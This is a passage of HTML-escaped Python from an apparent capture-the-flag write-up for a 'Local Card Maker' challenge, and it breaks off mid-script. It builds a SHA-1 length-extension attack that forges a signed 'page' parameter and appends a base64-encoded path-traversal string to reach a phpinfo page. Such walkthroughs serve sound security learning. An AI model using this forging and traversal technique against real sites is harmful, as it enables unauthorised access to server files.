&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            temp &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([rotl(a, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;5&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;), f, e, k, w[i]])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            e &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            d &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;rotl(b, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;30&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;a
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            a &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;temp
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        h0 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([h0, a])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        h1 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([h1, b])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        h2 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([h2, c])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        h3 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([h3, d])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        h4 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([h4, e])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(h0, h1, h2, h3, h4)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;pad&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;msg&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sz &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;None&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;sz &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;== &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;None&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        sz &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;len&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(msg)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    bits &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;sz &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    padding &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;512 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;- &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;((bits &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;% &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;512&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;- &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    msg &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;\x80&amp;amp;quot;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# append bit &amp;amp;quot;1&amp;amp;quot;, and a few zeros.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;msg &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;int&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(padding &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;#x2F; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;\x00&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;struct.pack(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;gt;q&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, bits)  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# don&amp;amp;#39;t count the \x80 here, hence the -8.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;sha1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;msg&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# These are the constants in a standard SHA-1
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sha1_impl(pad(msg), &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x67452301 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0xefcdab89 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x98badcfe &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x10325476 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0xc3d2e1f0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# &amp;amp;quot;Local Card Maker&amp;amp;quot;-specific implementation starts here:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;sha1_bytes_to_str&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;result&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;.join([&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;hex&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(x)[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;2&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;:].zfill(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;2&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;x &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;result])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;get_h_values&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;hash_string&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Divide hash_string to 5 ints, 4 bytes each
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;int&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(hash_string[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;:(i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;], &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;16&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;5&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# &amp;amp;quot;view_profile&amp;amp;quot; taken from site (&amp;amp;quot;page&amp;amp;quot; query parameter)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_1_buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;dmlld19wcm9maWxl&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Hash taken from site (&amp;amp;quot;pHash&amp;amp;quot; query parameter)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_1_hash &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;7b6f8b016f25da478b9f28f878aa3be8cced66fd&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_1_h_values &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;get_h_values(block_1_hash)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# taken from description of challenge
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;salt_len &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;23
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# &amp;amp;quot;aaa&amp;amp;quot; is padding, since the previous SHA-1 block contains the length at the end which is parsed by PHP as Base64 data.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# I align to 4 bytes in order for the appended path to be parsed correctly.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_2_buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;aaa&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;base64.encodebytes(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;..&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;phpinfo&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;).replace(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;\n&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Pad this second block, use a custom size with additional 64 bytes to account for the first block (which is always padded to 64)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_2_buf_padded &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;pad(block_2_buf, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;len&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(block_2_buf) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;64&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;joined_buf_hash &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sha1_bytes_to_str(sha1_impl(block_2_buf_padded, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;block_1_h_values))
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;print&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(joined_buf_hash)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Add 23 &amp;amp;quot;A&amp;amp;quot;s to simulate the SHA-1 block creation with the salt, but remove the salt since it&amp;amp;#39;ll be added by the server.
